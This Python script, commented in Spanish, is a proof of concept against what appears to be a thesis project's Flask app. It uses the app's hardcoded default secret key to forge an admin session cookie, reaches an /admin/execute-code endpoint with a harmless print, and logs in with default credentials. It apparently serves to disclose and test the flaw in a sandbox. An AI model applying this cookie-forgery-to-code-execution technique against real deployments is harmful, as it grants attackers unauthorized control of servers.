#!/usr/bin/env python3
"""
Demuestra que, si no se define FLASK_SECRET_KEY, la clave por defecto hardcodeada en app.py
('tfm_secret_key_fixed_12345', pública en el repositorio) permite FORJAR una cookie de sesión
{'admin': True} SIN credenciales y llegar a /admin/execute-code (ejecución de código).
La prueba ejecuta sólo un print inocuo. Ejecutar SIEMPRE sobre una copia sandbox de Web/.

Uso: PYTHONDONTWRITEBYTECODE=1 python forge_session_demo.py --app-dir <sandbox>/run/Web
"""
import argparse, os, sys


def main():
    ap = argparse.ArgumentParser(); ap.add_argument("--app-dir", required=True); a = ap.parse_args()
    for k in ("FLASK_SECRET_KEY", "APP_USERNAME", "APP_PASSWORD", "GEMINI_API_KEY"):
        os.environ.pop(k, None)  # configuración "por defecto", como en un despliegue descuidado
    os.chdir(a.app_dir); sys.path.insert(0, a.app_dir)
    import app as appmod
    app = appmod.app
    print("secret_key por defecto en uso:", app.secret_key == "tfm_secret_key_fixed_12345")
    print("credenciales por defecto:", appmod._APP_USERNAME, "/", "(len=%d)" % len(appmod._APP_PASSWORD),
          "iguales al usuario:", appmod._APP_USERNAME == appmod._APP_PASSWORD)

    # El atacante sólo conoce la clave pública del repo: firma su propia cookie con la API de Flask.
    from flask.sessions import SecureCookieSessionInterface
    attacker_app = type(app)("attacker"); attacker_app.secret_key = "tfm_secret_key_fixed_12345"
    forged = SecureCookieSessionInterface().get_signing_serializer(attacker_app).dumps({"admin": True})

    c = app.test_client()
    c.set_cookie("session", forged)
    r = c.post("/admin/execute-code", json={"code": "import sys; sys.stderr.write('FORGED_ADMIN_RCE_OK')"})
    print("POST /admin/execute-code con cookie forjada ->", r.status_code,
          "| prueba ejecutada:", "FORGED_ADMIN_RCE_OK" in r.get_data(as_text=True))
    r = c.get("/admin")
    print("GET /admin con cookie forjada ->", r.status_code)
    # Login con credenciales por defecto (usuario == contraseña == nombre de la entidad)
    c2 = app.test_client()
    r = c2.post("/login_admin", data={"username": appmod._APP_USERNAME, "password": appmod._APP_PASSWORD})
    print("POST /login_admin con credenciales por defecto ->", r.status_code, r.headers.get("Location"))


if __name__ == "__main__":
    main()
